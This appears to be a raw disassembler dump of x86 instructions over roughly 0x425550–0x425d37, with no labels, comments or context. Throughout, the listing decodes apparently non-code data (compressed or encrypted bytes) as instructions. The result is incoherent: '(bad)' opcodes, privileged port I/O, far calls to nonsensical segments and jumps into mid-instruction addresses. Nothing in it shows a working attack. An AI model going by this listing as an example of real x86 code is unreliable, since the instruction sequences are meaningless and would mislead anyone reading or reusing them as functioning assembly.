  425550:	loope  0x42552e
  425552:	xor    BYTE PTR [edx+0x55],0xff
  425556:	xchg   esp,eax
  425557:	retf   
  425558:	mov    bh,0x4f
  42555a:	and    dh,al
  42555c:	add    eax,0xd026d12c
  425561:	jno    0x425580
  425563:	sbb    BYTE PTR [di],bl
  425566:	cmc    
  425567:	or     eax,DWORD PTR [eax-0x46]
  42556a:	js     0x4255ae
  42556c:	fsub   st,st(5)
  42556e:	or     BYTE PTR [edx+0x224e6456],bh
  425574:	in     eax,dx
  425575:	das    
  425576:	out    dx,eax
  425577:	add    bh,al
  425579:	pop    ecx
  42557a:	xchg   eax,edx
  42557c:	das    
  42557d:	out    0xfb,eax
  42557f:	jnp    0x4255b1
  425581:	xchg   esp,eax
  425582:	cmp    al,0xfd
  425584:	(bad)  [ecx]
  425586:	(bad)  
  425588:	mov    esp,0x515ff5a8
  42558d:	les    edx,FWORD PTR [esi+esi*8-0x563b7db0]
  425594:	mul    BYTE PTR [ebx+0x3]
  425597:	mov    ecx,0xef9256d8
  42559c:	jae    0x42561b
  42559e:	ret    0xfa17
  4255a1:	add    eax,DWORD PTR [ebp+0x4]
  4255a4:	in     al,0x1e
  4255a6:	int3   
  4255a7:	inc    esi
  4255a9:	xor    esp,esp
  4255ab:	ret    
  4255ac:	inc    edx
  4255ad:	dec    ecx
  4255ae:	loope  0x425538
  4255b0:	daa    
  4255b1:	call   0x3f15:0x27c4d8b4
  4255b8:	in     eax,0xd1
  4255ba:	(bad)  
  4255bb:	retf   
  4255bc:	cmp    al,0x9c
  4255be:	jg     0x425564
  4255c0:	add    eax,0x9d3f7901
  4255c5:	and    eax,0xe7c84e20
  4255ca:	jg     0x4255ee
  4255cc:	inc    eax
  4255cd:	out    dx,eax
  4255ce:	enter  0xddad,0x40
  4255d2:	sub    al,0x81
  4255d4:	xchg   ebp,eax
  4255d5:	outs   dx,BYTE PTR ds:[esi]
  4255d6:	pop    esp
  4255d7:	ror    bh,1
  4255d9:	mov    esi,0x666df64
  4255de:	pop    esp
  4255df:	and    DWORD PTR [edi-0x4ed77adb],0xffffff96
  4255e6:	mov    edx,0x33ccebc9
  4255eb:	arpl   bp,sp
  4255ed:	push   ecx
  4255ee:	adc    al,0xc6
  4255f0:	jge    0x42561f
  4255f2:	and    al,0x76
  4255f4:	imul   esi,DWORD PTR [ecx],0xba281206
  4255fa:	xor    ch,bl
  4255fc:	test   al,0xfe
  4255fe:	ss pushaw 
  425601:	xlat   BYTE PTR ds:[ebx]
  425602:	or     DWORD PTR [esi],ebx
  425604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425605:	arpl   WORD PTR [ecx-0x1ded5cca],bx
  42560b:	sbb    DWORD PTR [ecx],ebx
  42560d:	cmp    BYTE PTR [edi+eiz*4],dh
  425610:	xchg   ebx,eax
  425611:	push   cs
  425612:	test   eax,0xfd47f002
  425617:	rol    esi,cl
  425619:	gs test eax,0xff6d5978
  42561f:	jnp    0x4255f1
  425621:	gs (bad) 
  425623:	jmp    0x425610
  425625:	pop    esi
  425626:	pop    edi
  425627:	push   eax
  425628:	xor    al,0xd
  42562a:	rol    BYTE PTR [ecx+0x39],cl
  42562d:	fisub  DWORD PTR [ebx]
  42562f:	push   es
  425630:	mov    edi,0x6000a9f7
  425635:	inc    edx
  425636:	sub    ebp,DWORD PTR [eax-0x18c2c60]
  42563c:	inc    esp
  42563d:	pop    ebp
  42563e:	sbb    esi,ebx
  425640:	pop    es
  425641:	mov    edi,0xe6ce8cdf
  425646:	popa   
  425647:	fwait
  425648:	jp     0x4255d2
  42564a:	mov    ch,0xcd
  42564c:	retf   0xd8
  42564f:	fsub   DWORD PTR [esi-0x7c]
  425652:	hlt    
  425653:	scas   al,BYTE PTR es:[edi]
  425654:	jle    0x42563a
  425656:	mov    ebp,0x30793ec4
  42565b:	mov    ecx,DWORD PTR [eax+eiz*1+0x47]
  42565f:	retf   
  425660:	adc    edx,DWORD PTR [edi-0x2c]
  425663:	nop
  425664:	sbb    edi,DWORD PTR [esi-0x12e945fb]
  42566a:	sub    ebp,ebp
  42566c:	ret    
  42566d:	(bad)
  425670:	cmp    BYTE PTR [ecx-0x64],0xb6
  425674:	mov    dl,BYTE PTR [ebp+0x7b2c73be]
  42567a:	rcl    BYTE PTR [eax+esi*4],cl
  42567d:	test   al,0x7c
  42567f:	pop    ecx
  425680:	out    0xbd,eax
  425682:	xor    BYTE PTR [ebp+0x2f52d271],dh
  425688:	cwde   
  425689:	jmp    0x425663
  42568b:	iret   
  42568c:	inc    edx
  42568d:	pop    ds
  42568e:	sbb    DWORD PTR [ebp-0x5a],0x85766772
  425695:	jns    0x42565d
  425697:	popf   
  425698:	cmc    
  425699:	jbe    0x425674
  42569b:	mov    ds:0x48e5b98f,eax
  4256a0:	mov    esp,es
  4256a2:	mov    edx,0xf16f7e0a
  4256a7:	aad    0xd0
  4256a9:	jmp    0x425720
  4256ab:	scas   al,BYTE PTR es:[edi]
  4256ac:	dec    ecx
  4256ad:	and    al,BYTE PTR [eax]
	...
  4256b7:	add    BYTE PTR [eax],al
  4256b9:	add    BYTE PTR [esi+0x74ef74ea],bh
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	dec    esp
  4256c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256c8:	(bad)  
  4256c9:	xor    DWORD PTR [eax-0x32],esi
  4256cc:	add    DWORD PTR [eax],eax
  4256ce:	cld    
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    cl,ah
  4256d3:	mov    ds:0x2fbbf44f,eax
  4256d8:	push   edx
  4256d9:	pop    ecx
  4256da:	int    0xe2
  4256dc:	ja     0x4256b3
  4256de:	jp     0x425694
  4256e0:	(bad)  
  4256e1:	shl    DWORD PTR [eax+0x1f],0x7d
  4256e5:	pop    esi
  4256e6:	push   ds
  4256e7:	sub    DWORD PTR [edi],ebp
  4256e9:	pop    eax
  4256ea:	xchg   esp,eax
  4256eb:	xlat   BYTE PTR ds:[ebx]
  4256ec:	ret    0xfd6e
  4256ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256f0:	aad    0x49
  4256f2:	cdq    
  4256f3:	test   eax,0x2d792222
  4256f8:	cmp    DWORD PTR [edi+0x2edec2fc],eax
  4256fe:	or     ah,BYTE PTR [ecx-0x72]
  425701:	aas    
  425702:	sbb    dl,BYTE PTR [esi-0x15]
  425705:	loopne 0x425708
  425707:	cmc    
  425708:	mov    ebx,0xd0edd8b2
  42570d:	sub    al,BYTE PTR [ecx+0x69ddabb2]
  425713:	xor    eax,0x3c4fa71d
  425718:	pop    edx
  425719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42571a:	fcom   QWORD PTR [ebx]
  42571c:	je     0x42578b
  42571e:	sbb    al,0xab
  425720:	inc    esi
  425721:	jl     0x4256d7
  425723:	mov    edi,0x77ca2472
  425728:	(bad)  
  425729:	fldenv [edi+esi*2+0x73]
  42572d:	call   0x8ef4ad9
  425732:	leave  
  425733:	push   esi
  425734:	(bad)  
  425735:	pop    eax
  425736:	dec    edi
  425737:	call   DWORD PTR [eax]
  425739:	mov    esp,?
  42573b:	cmp    al,0x63
  42573d:	jne    0x425700
  42573f:	and    DWORD PTR ds:0xf16b64,0x796da5ca
  425749:	sar    edi,1
  42574b:	cmp    bh,0x99
  42574e:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  425750:	out    dx,al
  425751:	jae    0x425725
  425753:	or     al,BYTE PTR [ebx-0x7449918e]
  425759:	out    0x26,al
  42575b:	jp     0x425784
  42575d:	push   ds
  42575e:	aas    
  42575f:	cdq    
  425760:	test   BYTE PTR [ecx+ecx*1+0x4920bdc9],al
  425767:	leave  
  425768:	add    eax,0x414aba2b
  42576d:	jae    0x42578d
  42576f:	dec    esi
  425770:	sti    
  425771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425772:	and    eax,0xea1d8c72
  425777:	cld    
  425778:	mov    ds:0xc88dfe32,eax
  42577d:	std    
  42577e:	outs   dx,DWORD PTR ds:[esi]
  42577f:	mov    esp,esp
  425781:	or     cl,BYTE PTR [edx-0x549a280f]
  425787:	loop   0x4257de
  425789:	data16 adc BYTE PTR [ecx+0x69],0x71
  42578e:	outs   dx,BYTE PTR ds:[esi]
  42578f:	shl    bl,cl
  425791:	dec    ebx
  425792:	iret   
  425793:	es sti 
  425795:	in     eax,0x5b
  425797:	ds fcmove st,st(0)
  42579a:	ss and al,0xf8
  42579d:	hlt    
  42579e:	shr    BYTE PTR ds:0x17235b95,0xc9
  4257a5:	lods   al,BYTE PTR ds:[esi]
  4257a6:	mov    ah,0x12
  4257a8:	repz clc 
  4257aa:	iret   
  4257ab:	fisubr DWORD PTR ds:0xbf0ad3e9
  4257b1:	sub    al,bh
  4257b3:	inc    ecx
  4257b4:	push   eax
  4257b5:	xor    bl,dl
  4257b7:	dec    esi
  4257b8:	out    dx,eax
  4257b9:	mov    bl,0xbe
  4257bb:	push   ss
  4257bc:	retf   0x2d7f
  4257bf:	sub    bl,BYTE PTR [edi]
  4257c1:	push   esi
  4257c2:	fldcw  WORD PTR [esi+0x17829f9b]
  4257c8:	call   0xac5ca318
  4257cd:	sbb    DWORD PTR [ecx+0x7f],esp
  4257d0:	or     ecx,DWORD PTR [ecx+edx*1-0x4b]
  4257d4:	shl    ebx,0x16
  4257d7:	mov    ecx,0xb5dc1b47
  4257dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257dd:	xchg   ebp,eax
  4257de:	dec    ebx
  4257df:	(bad)  
  4257e0:	jp     0x42585a
  4257e2:	jo     0x4257d5
  4257e4:	(bad)  
  4257e8:	clc    
  4257e9:	aaa    
  4257ea:	adc    ecx,DWORD PTR [ebx-0x875dd4b]
  4257f0:	sub    BYTE PTR [edi],0x95
  4257f3:	jg     0x4257e5
  4257f5:	daa    
  4257f6:	mov    bl,0xd9
  4257f8:	mov    BYTE PTR [ebx+0x41a3c1ef],dl
  4257fe:	(bad)
  425802:	mov    ah,0xa0
  425804:	ds dec ebx
  425806:	test   eax,0xb3732c2c
  42580b:	(bad)  
  42580c:	clc    
  42580d:	repz fwait
  42580f:	add    BYTE PTR [ecx],cl
  425811:	fcom   QWORD PTR [ecx]
  425813:	inc    esi
  425814:	sbb    bh,BYTE PTR [ebx]
  425816:	lods   al,BYTE PTR ds:[esi]
  425817:	add    eax,0x3b23ac19
  42581c:	arpl   WORD PTR [ebp-0x5c28b814],cx
  425822:	aam    0x10
  425824:	or     eax,DWORD PTR [ecx]
  425826:	dec    esi
  425827:	std    
  425828:	ja     0x425822
  42582a:	ins    DWORD PTR es:[edi],dx
  42582b:	and    al,0xe5
  42582d:	das    
  42582e:	cmp    DWORD PTR [ebp+0x4d],ebx
  425831:	jno    0x42585b
  425833:	mov    dh,BYTE PTR [ebp+0x28b75389]
  425839:	imul   eax,DWORD PTR [edi-0x3fdfaf88],0xd06844d5
  425843:	jne    0x425871
  425845:	aaa    
  425846:	idiv   BYTE PTR [eax+0xb]
  425849:	mov    edi,eax
  42584b:	(bad)  
  42584c:	fidiv  WORD PTR [edx-0x36]
  42584f:	scas   eax,DWORD PTR es:[edi]
  425850:	popf   
  425851:	lods   al,BYTE PTR ds:[esi]
  425852:	xor    cl,dl
  425854:	repz add eax,0x7b8fbb3
  42585a:	data16 lock ror si,0x61
  425860:	shl    DWORD PTR [eax+0x2a],1
  425863:	dec    edi
  425864:	xor    bh,BYTE PTR [esi]
  425866:	in     al,dx
  425867:	add    BYTE PTR [ebx+ebx*8],bh
  42586a:	rol    DWORD PTR [ecx-0x3a2e990c],cl
  425870:	push   eax
  425871:	xor    edx,ebp
  425873:	add    eax,0xbc7c3576
  425878:	rcl    BYTE PTR [ebx-0x68],1
  42587b:	or     eax,0x45a8aac1
  425880:	mov    ah,0xf
  425882:	inc    edi
  425883:	push   ss
  425884:	mov    ds:0xa1ff9b57,al
  425889:	mov    BYTE PTR [edx-0x16],ch
  42588c:	ja     0x425869
  42588e:	sbb    bh,0x10
  425891:	adc    al,0x10
  425893:	mov    dh,0x8f
  425895:	lods   eax,DWORD PTR ds:[esi]
  425896:	(bad)  
  425897:	stos   DWORD PTR es:[edi],eax
  425898:	add    BYTE PTR [edi-0x6ef9f1ab],cl
  42589e:	mov    al,ds:0x6f11c74c
  4258a3:	pop    es
  4258a4:	(bad)  
  4258a6:	neg    ebx
  4258a8:	mov    ah,0xd7
  4258aa:	fiadd  DWORD PTR [ecx-0x79adb2bc]
  4258b0:	fsubr  DWORD PTR [edi-0x6649d3f1]
  4258b6:	pop    ecx
  4258b7:	aad    0xdc
  4258b9:	outs   dx,BYTE PTR ds:[esi]
  4258ba:	push   edx
  4258bb:	ret    0x30f3
  4258be:	push   ebp
  4258bf:	jo     0x425937
  4258c1:	and    bl,0xb4
  4258c4:	dec    edi
  4258c5:	call   0x6af2c18d
  4258ca:	adc    DWORD PTR [edx+0x2c],esi
  4258cd:	sbb    al,BYTE PTR [eax]
	...
  4258d7:	add    BYTE PTR [eax],al
  4258d9:	add    BYTE PTR [ebx+0x45],cl
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	cdq    
  4258e7:	cs call 0xfc00:0x1d06cc0
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    BYTE PTR [esi-0x6a],al
  4258f4:	mov    esp,0xeea89120
  4258f9:	lods   al,BYTE PTR ds:[esi]
  4258fa:	aam    0x3d
  4258fc:	outs   dx,DWORD PTR ds:[esi]
  4258fd:	repz es iret 
  425900:	sahf   
  425901:	sbb    DWORD PTR [esi-0x6538ee3c],eax
  425907:	mov    eax,0xb0326a39
  42590c:	xor    al,0x59
  42590e:	mov    esi,0x4688b595
  425913:	stc    
  425914:	jae    0x425995
  425916:	dec    esi
  425917:	std    
  425918:	test   al,0x79
  42591a:	sbb    edx,DWORD PTR [edx]
  42591c:	inc    edi
  42591d:	fsubr  st,st(7)
  42591f:	test   bl,al
  425921:	mov    ds:0x243a836,eax
  425926:	lea    edx,[edi]
  425928:	fisubr DWORD PTR [edx-0x28]
  42592b:	fimul  DWORD PTR [ebx]
  42592d:	dec    ebp
  42592e:	mov    cl,0xcd
  425930:	loop   0x425992
  425932:	dec    ecx
  425933:	test   al,0x3b
  425935:	gs pop ebp
  425937:	popf   
  425938:	pusha  
  425939:	cmp    DWORD PTR [ebp+0x22],eax
  42593c:	int3   
  42593d:	mov    bl,dl
  42593f:	in     al,0x80
  425941:	jno    0x42592a
  425943:	mov    edx,0x326d7db3
  425948:	jbe    0x42598e
  42594a:	xor    dl,dl
  42594c:	(bad)  
  42594d:	mov    bh,0x9d
  42594f:	or     ch,BYTE PTR [eax+0x3a87e844]
  425955:	test   BYTE PTR [eax],dh
  425957:	fidiv  WORD PTR [ebx]
  425959:	mov    cl,0x62
  42595b:	enter  0xf57e,0x90
  42595f:	pop    es
  425960:	stos   BYTE PTR es:[edi],al
  425961:	dec    esi
  425962:	dec    edi
  425963:	mov    bl,0xad
  425965:	mov    ebp,0x5846881d
  42596a:	icebp  
  42596b:	push   cs
  42596c:	(bad)  
  42596d:	mov    ch,0xfa
  42596f:	sbb    DWORD PTR [eax+0x5c],eax
  425972:	mov    eax,ds:0x5b850a3
  425977:	inc    eax
  425978:	daa    
  425979:	push   cs
  42597a:	xlat   BYTE PTR ds:[ebx]
  42597b:	xchg   esi,eax
  42597c:	jae    0x4259fa
  42597e:	fnsetpm(287 only) 
  425980:	and    BYTE PTR [eax],al
  425982:	inc    eax
  425983:	int    0x32
  425985:	mov    dh,0x4
  425987:	mov    esp,0xfab8cf4c
  42598c:	lods   eax,DWORD PTR ds:[esi]
  42598d:	cli    
  42598e:	cmp    BYTE PTR [eax-0x369bb6f5],dh
  425994:	aaa    
  425995:	mov    edi,0x9f437bc5
  42599a:	mov    BYTE PTR [edx],bl
  42599c:	sbb    DWORD PTR [esp+esi*4-0x23],edx
  4259a0:	sub    al,0x49
  4259a2:	sbb    edx,ecx
  4259a4:	mov    al,dh
  4259a6:	add    dl,0x15
  4259a9:	jae    0x425939
  4259ab:	mov    DWORD PTR [eax],ebp
  4259ad:	fcom   DWORD PTR [edi]
  4259af:	rol    BYTE PTR [si],cl
  4259b2:	or     DWORD PTR [esp+ecx*4+0x24],ebp
  4259b6:	test   ax,bp
  4259b9:	sahf   
  4259ba:	cmp    ah,BYTE PTR [esi]
  4259bc:	fdivr  QWORD PTR [eax-0x2a]
  4259bf:	fbstp  TBYTE PTR [esi-0x36]
  4259c2:	pop    ebx
  4259c3:	test   BYTE PTR [ecx+0x59],ch
  4259c6:	add    al,0x9c
  4259c8:	iret   
  4259c9:	adc    BYTE PTR [edi],ah
  4259cb:	out    0xbf,eax
  4259cd:	add    al,0x85
  4259cf:	ficom  DWORD PTR [ebx-0x6aad7fe8]
  4259d5:	je     0x425a04
  4259d7:	cmc    
  4259d8:	xchg   esp,eax
  4259d9:	push   0xffffffba
  4259db:	cmp    ebp,ecx
  4259dd:	xor    BYTE PTR [edx+0x2caa815a],ch
  4259e3:	loop   0x4259f9
  4259e5:	cli    
  4259e6:	arpl   si,bx
  4259e8:	add    DWORD PTR [ebx-0x4302cee1],esi
  4259ee:	mov    WORD PTR fs:[ebx],ss
  4259f1:	loopne 0x425a03
  4259f3:	fist   DWORD PTR [eax+0x61]
  4259f6:	sub    BYTE PTR [eax+0x3a],dh
  4259f9:	sub    bl,BYTE PTR [edx+esi*1+0x1b242a01]
  425a00:	sub    ecx,DWORD PTR [esi+0x28d949ec]
  425a06:	ja     0x4259c9
  425a08:	icebp  
  425a09:	sbb    cl,BYTE PTR [ebp+0x11]
  425a0c:	add    eax,0xc75d2a56
  425a11:	pop    ecx
  425a12:	(bad)  
  425a13:	xlat   BYTE PTR ds:[ebx]
  425a14:	jmp    0xe6c3:0x2adaf187
  425a1b:	arpl   WORD PTR ds:0xd8839b07,bx
  425a21:	xchg   esp,eax
  425a22:	or     BYTE PTR [esi],ah
  425a24:	mov    ecx,DWORD PTR [eax-0x385ebc36]
  425a2a:	sub    ecx,DWORD PTR [ebx-0x7a]
  425a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a2e:	cld    
  425a2f:	ss hlt 
  425a31:	into   
  425a32:	aad    0xd5
  425a34:	inc    esi
  425a35:	out    0xef,eax
  425a37:	push   0xdd95325b
  425a3c:	leave  
  425a3d:	sub    BYTE PTR [ecx+esi*2-0x4b6ca862],bl
  425a44:	cmp    dh,BYTE PTR [esi-0x1a]
  425a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a48:	(bad)  
  425a49:	hlt    
  425a4a:	leave  
  425a4b:	loop   0x425a63
  425a4d:	div    BYTE PTR [eax+0x728fdf5f]
  425a53:	inc    edx
  425a54:	dec    BYTE PTR [esi+0x66e9c99b]
  425a5a:	test   BYTE PTR [eax-0x3a0e62d4],ch
  425a60:	icebp  
  425a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a62:	lea    esi,[esi+ecx*2-0x9cc255c]
  425a69:	mov    bh,0x7a
  425a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a6c:	dec    ebx
  425a6d:	xchg   ebx,eax
  425a6e:	ds inc ebx
  425a70:	mov    ah,ah
  425a72:	push   0xffffffad
  425a74:	sbb    dh,BYTE PTR [ecx+0x372edfe6]
  425a7a:	(bad)  
  425a7b:	daa    
  425a7c:	mov    BYTE PTR [ebp+0x6c4d531d],0x8d
  425a83:	dec    ebx
  425a84:	add    bh,BYTE PTR [ecx]
  425a86:	cmp    edx,DWORD PTR [edx+0x3bcbaabe]
  425a8c:	sub    eax,0xaf9e9890
  425a91:	les    ebx,FWORD PTR [esi+0x30]
  425a94:	rcl    BYTE PTR [esi-0x7947f877],cl
  425a9a:	jbe    0x425a52
  425a9c:	shr    cl,0xeb
  425a9f:	xor    ah,BYTE PTR [ebp+0x71]
  425aa2:	mov    ebx,0x194a422a
  425aa7:	call   0xa320:0x60a77da8
  425aae:	dec    edi
  425aaf:	adc    eax,0xd7c0a2f2
  425ab4:	xor    BYTE PTR [edx+0x32],0xce
  425ab8:	sbb    bh,al
  425aba:	adc    BYTE PTR [edi-0x10],dh
  425abd:	adc    BYTE PTR [edi],cl
  425abf:	nop
  425ac0:	mov    al,0x8f
  425ac2:	and    eax,0x25721254
  425ac7:	(bad)  
  425ac8:	retf   
  425ac9:	mov    ds:0xa4de5ac2,eax
  425ace:	out    dx,eax
  425acf:	loope  0x425acb
  425ad1:	jne    0x425b4b
  425ad3:	inc    edx
  425ad4:	xor    al,ah
  425ad6:	leave  
  425ad7:	fs jl  0x425b0d
  425ada:	fs mov ebp,0xca8b483a
  425ae0:	mov    eax,ds:0xb3081a69
  425ae5:	fsubr  DWORD PTR [esi+esi*1]
  425ae8:	arpl   WORD PTR [edi],bp
  425aea:	aaa    
  425aeb:	xlat   BYTE PTR ds:[ebx]
  425aec:	out    0x2c,eax
	...
  425afa:	stos   BYTE PTR es:[edi],al
  425afb:	jo     0x425add
  425afd:	dec    ecx
  425afe:	cli    
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	rcl    DWORD PTR [ebx-0x5e],1
  425b09:	sahf   
  425b0a:	push   0xfc0001d2
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    BYTE PTR [edi],dh
  425b13:	and    ebp,DWORD PTR [esi]
  425b15:	sub    edx,edx
  425b17:	sub    al,0xd4
  425b19:	rcr    BYTE PTR [edx],cl
  425b1b:	sahf   
  425b1c:	fs sub bl,dh
  425b1f:	cwde   
  425b20:	fstp   DWORD PTR [eax-0x70]
  425b23:	or     al,BYTE PTR [esi+0x1ef97a9c]
  425b29:	sbb    ch,BYTE PTR [eax]
  425b2b:	leave  
  425b2c:	push   cs
  425b2d:	mov    ecx,0x9373ada7
  425b32:	ret    0xa847
  425b35:	push   es
  425b36:	lods   al,BYTE PTR ds:[esi]
  425b37:	push   ebx
  425b38:	sub    BYTE PTR [eax],0x70
  425b3b:	stos   BYTE PTR es:[edi],al
  425b3c:	in     eax,0x24
  425b3e:	mov    ecx,0xeed11bc2
  425b43:	aas    
  425b44:	in     eax,dx
  425b45:	cwde   
  425b46:	stos   BYTE PTR es:[edi],al
  425b47:	aaa    
  425b48:	ins    DWORD PTR es:[edi],dx
  425b49:	mov    al,ds:0x43c8d33a
  425b4e:	xchg   esi,eax
  425b4f:	ror    BYTE PTR [esi+0x5d58368e],0x3a
  425b56:	fst    QWORD PTR [eax]
  425b58:	inc    esp
  425b59:	mov    bl,0x24
  425b5b:	es push edi
  425b5d:	mov    edi,0x95982596
  425b62:	clc    
  425b63:	xor    dh,BYTE PTR [edi-0x3d]
  425b66:	inc    esi
  425b67:	and    eax,0xc719a36b
  425b6c:	popf   
  425b6d:	out    dx,al
  425b6e:	dec    esi
  425b6f:	sub    BYTE PTR [esi+ebx*4+0x68],al
  425b73:	scas   al,BYTE PTR es:[edi]
  425b74:	adc    BYTE PTR ss:[esi],dh
  425b77:	sahf   
  425b78:	and    DWORD PTR [eax+0x1cdc8089],edi
  425b7e:	sub    eax,0x22931db
  425b83:	or     eax,0x326ca1b4
  425b88:	(bad)  
  425b8a:	test   eax,0x15d189e8
  425b8f:	sbb    ebp,ecx
  425b91:	sbb    eax,0x6edd0ef
  425b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b97:	mov    bh,0x44
  425b99:	sbb    eax,0xc171adac
  425b9e:	sbb    eax,0xa0541c67
  425ba3:	ins    BYTE PTR es:[edi],dx
  425ba4:	or     al,BYTE PTR [esi+0x38]
  425ba7:	cmp    ebp,esi
  425ba9:	out    dx,eax
  425baa:	add    edi,DWORD PTR [esi]
  425bac:	mov    WORD PTR [ecx+0x2ecac5c3],ss
  425bb2:	test   BYTE PTR [ebp-0x18],ah
  425bb5:	jns    0x425b78
  425bb7:	push   eax
  425bb8:	cmp    esp,esp
  425bba:	fcom   DWORD PTR [eax]
  425bbc:	rcr    bl,0x62
  425bbf:	mov    esp,0x6dedec7d
  425bc4:	repz fimul DWORD PTR [edx-0x3a]
  425bc8:	jb     0x425c21
  425bca:	repz add al,0x5c
  425bcd:	pop    ds
  425bce:	fcomi  st,st(0)
  425bd0:	xchg   ebx,eax
  425bd1:	jmp    0xdce2:0xdb7bc36e
  425bd8:	pop    esi
  425bd9:	push   ecx
  425bda:	cmp    ch,BYTE PTR [edi+0x3a]
  425bdd:	push   esi
  425bde:	fucomi st,st(4)
  425be0:	jle    0x425c61
  425be2:	and    al,0x30
  425be4:	stos   BYTE PTR es:[edi],al
  425be5:	je     0x425b7f
  425be7:	or     al,0x36
  425be9:	out    dx,al
  425bea:	retf   
  425beb:	pop    ebx
  425bec:	arpl   WORD PTR [ecx+0x5f],ax
  425bef:	jle    0x425c4f
  425bf1:	iret   
  425bf2:	cmc    
  425bf3:	stos   DWORD PTR es:[edi],eax
  425bf4:	stos   BYTE PTR es:[edi],al
  425bf5:	push   ss
  425bf6:	lds    ecx,FWORD PTR [ecx]
  425bf8:	retf   
  425bf9:	mov    gs,WORD PTR [ecx]
  425bfb:	daa    
  425bfc:	out    0xf9,eax
  425bfe:	xor    al,al
  425c00:	test   BYTE PTR [ecx-0x16],bl
  425c03:	xor    eax,0xe635fab6
  425c08:	fbstp  TBYTE PTR [ecx+eax*8+0x3d0df45e]
  425c0f:	adc    cl,bl
  425c11:	dec    edi
  425c12:	in     al,dx
  425c13:	cmp    dh,BYTE PTR [ebx+0x493a85bf]
  425c19:	inc    eax
  425c1a:	js     0x425c52
  425c1c:	adc    al,0xb2
  425c1e:	sar    BYTE PTR [ecx],0xbc
  425c21:	sub    eax,0x338c87a1
  425c26:	push   ebp
  425c27:	mov    esp,0xfaabc4e3
  425c2c:	inc    ebx
  425c2d:	and    eax,0x56c33282
  425c32:	sub    BYTE PTR [ebp+eiz*8-0x2a],cl
  425c36:	popf   
  425c37:	sub    al,0x4a
  425c39:	dec    edx
  425c3a:	aad    0xd5
  425c3c:	mov    eax,ds:0x97488405
  425c41:	xor    eax,0x7430d3e7
  425c46:	fistp  QWORD PTR [ebx-0x508cbdc0]
  425c4c:	push   cs
  425c4d:	mov    ebp,0x341e8fee
  425c52:	mov    edx,0x1183d5d
  425c57:	adc    ah,dh
  425c59:	adc    eax,0x20b606b1
  425c5e:	pop    edx
  425c5f:	imul   esp,esp,0x9
  425c62:	push   0xffffff96
  425c64:	(bad)  
  425c65:	mov    ah,0x89
  425c67:	or     BYTE PTR [eax+ecx*4],al
  425c6a:	mov    esp,0x3041f4a6
  425c6f:	mov    ch,0x7c
  425c71:	adc    edi,DWORD PTR [ecx+0x69]
  425c74:	inc    esp
  425c75:	sub    ecx,esi
  425c77:	dec    eax
  425c78:	icebp  
  425c79:	xor    BYTE PTR [eax],ah
  425c7b:	adc    bh,bl
  425c7d:	fistp  QWORD PTR [ecx+edi*2]
  425c80:	scas   al,BYTE PTR es:[edi]
  425c81:	enter  0xac28,0x50
  425c85:	rcr    BYTE PTR [esi+0x3081987f],1
  425c8b:	loope  0x425c88
  425c8d:	pop    edx
  425c8e:	add    BYTE PTR [eax+0xe092f7f],dl
  425c94:	inc    edx
  425c95:	(bad)  
  425c96:	test   eax,0x5414dd30
  425c9b:	js     0x425c2e
  425c9d:	or     ch,BYTE PTR [esi]
  425c9f:	fidivr WORD PTR [eax-0x64]
  425ca2:	and    eax,0x8b151732
  425ca7:	in     al,0x1e
  425ca9:	jp     0x425d24
  425cab:	adc    dh,BYTE PTR ss:[eax-0x3fc32c16]
  425cb2:	cmp    eax,0xc9a5775
  425cb7:	ja     0x425cf5
  425cb9:	mov    ds:0xb6c11549,eax
  425cbe:	(bad)  
  425cbf:	jbe    0x425d02
  425cc1:	or     al,0xd9
  425cc3:	les    esp,FWORD PTR ds:0x325ee5f8
  425cc9:	xchg   ch,bh
  425ccb:	push   0xffffffde
  425ccd:	ret    0xef0b
  425cd0:	mov    ds:0xe63c9c2b,eax
  425cd5:	jge    0x425c60
  425cd7:	retf   0x2187
  425cda:	cmp    BYTE PTR [edx],0xed
  425cdd:	mov    ebp,0x6b3815f6
  425ce2:	jbe    0x425d5e
  425ce4:	scas   eax,DWORD PTR es:[edi]
  425ce5:	mov    eax,0xe6d88491
  425cea:	mov    cl,0x97
  425cec:	xor    al,0xf0
  425cee:	shl    BYTE PTR [eax],0x40
  425cf1:	ins    BYTE PTR es:[edi],dx
  425cf2:	lds    ecx,FWORD PTR [ecx-0x51]
  425cf5:	pop    edx
  425cf6:	cwde   
  425cf7:	ins    DWORD PTR es:[edi],dx
  425cf8:	ja     0x425cb0
  425cfa:	mov    ch,cl
  425cfc:	cmp    BYTE PTR ds:0xa0258bdf,cl
  425d02:	jecxz  0x425d30
  425d04:	hlt    
  425d05:	arpl   WORD PTR [ecx],bx
  425d07:	add    dh,BYTE PTR [ebx+0x28]
  425d0a:	retf   0xdeae
  425d0d:	mov    WORD PTR [eax],es
	...
  425d17:	add    BYTE PTR [eax],al
  425d19:	add    BYTE PTR [edx-0x79],cl
  425d1c:	push   edx
  425d1d:	dec    esp
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi+0x6c6d210f],ecx
  425d27:	test   eax,0xd464213e
  425d2c:	add    DWORD PTR [eax],eax
  425d2e:	cld    
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [edx],dl
  425d33:	jl     0x425d9a
  425d35:	rcr    dh,cl
  425d37:	mov    eax,0x19196693
